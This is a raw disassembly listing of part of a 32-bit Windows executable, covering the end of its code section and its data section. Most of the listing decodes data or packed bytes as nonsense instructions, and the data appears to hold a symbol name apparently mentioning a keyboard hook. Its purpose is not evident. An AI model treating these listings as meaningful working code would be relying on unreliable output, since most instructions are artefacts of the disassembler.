  412a23:	loope  0x4129c7
  412a25:	sti    
  412a26:	jmp    FWORD PTR [edi]
  412a28:	mov    cs,eax
  412a2a:	xchg   esi,eax
  412a2b:	sbb    ah,cl
  412a2d:	retf   
  412a2e:	xchg   edi,eax
  412a2f:	clc    
  412a30:	sub    ch,0xde
  412a33:	or     al,0x5
  412a35:	repnz stc 
  412a37:	fist   DWORD PTR [ebp+0x1724fe5]
  412a3d:	dec    esp
  412a3e:	retf   
  412a3f:	or     BYTE PTR [ebp+0x78],ah
  412a42:	and    bl,dh
  412a44:	or     al,dh
  412a46:	test   BYTE PTR [eax+0x7db06d41],dh
  412a4c:	mov    ebx,0x1e7906de
  412a51:	std    
  412a52:	pop    ecx
  412a53:	pop    esi
  412a54:	adc    al,bh
  412a56:	push   0x95706a6e
  412a5b:	xchg   edi,eax
  412a5c:	and    eax,DWORD PTR [ebp-0x7632c2dd]
  412a62:	pop    ebx
  412a63:	pop    ebx
  412a64:	aas    
  412a65:	jge    0x4129eb
  412a67:	pushf  
  412a68:	sbb    esp,DWORD PTR [ebp-0x3a60c54]
  412a6e:	cmc    
  412a6f:	arpl   WORD PTR ds:0xd7472c6f,dx
  412a75:	jae    0x412a78
  412a77:	lods   al,BYTE PTR fs:[esi]
  412a79:	mov    al,ds:0x340a7d4d
  412a7e:	pop    esp
  412a7f:	div    DWORD PTR [eax-0x71]
  412a82:	imul   edx,DWORD PTR ds:0xc03081be,0xffffffb7
  412a89:	mov    esp,0xd88e3c32
  412a8e:	xchg   ebx,eax
  412a8f:	xor    al,0x9
  412a91:	int3   
  412a92:	mov    ds:0xafd363aa,eax
  412a97:	add    DWORD PTR [ebx-0x52],0xc0f216fd
  412a9e:	fsubr  QWORD PTR [edi]
  412aa0:	not    bl
  412aa2:	jl     0x412af1
  412aa4:	icebp  
  412aa5:	lock aas 
  412aa7:	adc    DWORD PTR [esi],ebx
  412aa9:	and    al,0x65
  412aab:	inc    edx
  412aac:	mov    bh,0x17
  412aae:	mov    ecx,edx
  412ab0:	ja     0x412ad2
  412ab2:	add    eax,0x31c377ba
  412ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ab8:	lds    esp,FWORD PTR [ebx+0x366d86b2]
  412abe:	add    cl,BYTE PTR [eax-0x691895b9]
  412ac4:	mov    eax,ds:0x72e8c543
  412ac9:	cmp    DWORD PTR [esi-0x42],0xfffffff8
  412acd:	push   ebx
  412ace:	hlt    
  412acf:	(bad)  
  412ad0:	pop    eax
  412ad1:	mov    WORD PTR [eax],ss
  412ad3:	jmp    0x412a86
  412ad5:	ins    DWORD PTR es:[edi],dx
  412ad6:	xchg   esp,eax
  412ad7:	jb     0x412ae0
  412ad9:	shl    BYTE PTR [edx+edx*1],cl
  412adc:	xlat   BYTE PTR ds:[ebx]
  412add:	add    BYTE PTR [ecx+ebx*1],bl
  412ae0:	cdq    
  412ae1:	add    BYTE PTR [edx],cl
  412ae3:	adc    DWORD PTR [ecx],ebp
  412ae5:	mov    ds:0x95b87003,eax
  412aea:	fsubrp st(6),st
  412aec:	mov    ebp,0x4ab971f6
  412af1:	enter  0x90e3,0x8d
  412af5:	lods   eax,DWORD PTR ds:[esi]
  412af6:	jmp    0xdfc0:0xca7e099a
  412afd:	sbb    dl,dh
  412aff:	pop    edx
  412b00:	push   ds
  412b01:	ror    DWORD PTR [edx+0x482cd688],1
  412b07:	(bad)  
  412b08:	aam    0x97
  412b0a:	adc    al,0xff
  412b0c:	in     al,dx
  412b0d:	push   esp
  412b0e:	or     DWORD PTR [esi-0x58],esi
  412b11:	sub    BYTE PTR [esi],al
  412b13:	sbb    DWORD PTR [edx+0x335a96aa],eax
  412b19:	push   es
  412b1a:	test   edx,edx
  412b1c:	adc    eax,0x75ee8998
  412b21:	mov    ds:0xfe12c82a,eax
  412b26:	and    eax,0x1452031b
  412b2b:	adc    eax,0xb21eeecb
  412b30:	adc    dh,BYTE PTR [ecx+0x66b72e7]
  412b36:	pop    eax
  412b37:	retf   
  412b38:	ins    BYTE PTR es:[edi],dx
  412b39:	test   bh,ah
  412b3b:	inc    esp
  412b3c:	and    BYTE PTR [eax],0x96
  412b3f:	jae    0x412b7d
  412b41:	jp     0x412ad1
  412b43:	mov    edi,0xb553df74
  412b48:	popa   
  412b49:	or     BYTE PTR [esi-0x75],0xe3
  412b4d:	call   0xabf6:0x5d3d2775
  412b54:	int    0xdf
  412b56:	adc    DWORD PTR [edi],ebx
  412b58:	push   0x92f6c5bb
  412b5d:	cmovp  ebx,DWORD PTR [bx-0x51]
  412b62:	fwait
  412b63:	pop    eax
  412b64:	jo     0x412b6e
  412b66:	call   0xed7c:0xcca0f182
  412b6d:	mov    WORD PTR [esi-0x3f7367e5],cs
  412b73:	xchg   ebx,eax
  412b74:	cmp    cl,BYTE PTR [edi+ebp*4]
  412b77:	sub    eax,0x51df32f5
  412b7c:	mov    eax,ds:0x20d48831
  412b81:	add    esp,edx
  412b83:	and    eax,0xd55e494e
  412b88:	in     al,dx
  412b89:	xor    eax,0x41fb6afa
  412b8e:	sub    BYTE PTR [edi+0x284d2396],dh
  412b94:	pop    ss
  412b95:	nop
  412b96:	dec    eax
  412b97:	dec    ebx
  412b98:	push   eax
  412b99:	js     0x412b63
  412b9b:	repz or cl,0x84
  412b9f:	scas   eax,DWORD PTR es:[edi]
  412ba0:	cli    
  412ba1:	jne    0x412bd8
  412ba3:	gs fcomi st,st(2)
  412ba6:	mov    ebp,0x2115ff9d
  412bab:	jge    0x412bed
  412bad:	ret    
  412bae:	ss in  eax,dx
  412bb0:	jmp    0xd940:0x21a490d9
  412bb7:	lds    edx,FWORD PTR [ecx-0x7ed9eddc]
  412bbd:	imul   bl
  412bbf:	cwde   
  412bc0:	xchg   BYTE PTR [eax],ah
  412bc2:	push   0x74
  412bc4:	(bad)  
  412bc6:	dec    BYTE PTR [ebx]
  412bc8:	dec    ebp
  412bc9:	ss xchg bh,cl
  412bcc:	cmp    DWORD PTR [esi],0xfeb7d757
  412bd2:	push   0x51
  412bd4:	test   eax,0x63609fcd
  412bd9:	imul   esp,DWORD PTR [edi+0x46a5d69],0xcb87435b
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0x43000000
  413429:	dec    ecx
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	inc    ebx
  41342d:	cmp    eax,DWORD PTR [ebx]
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
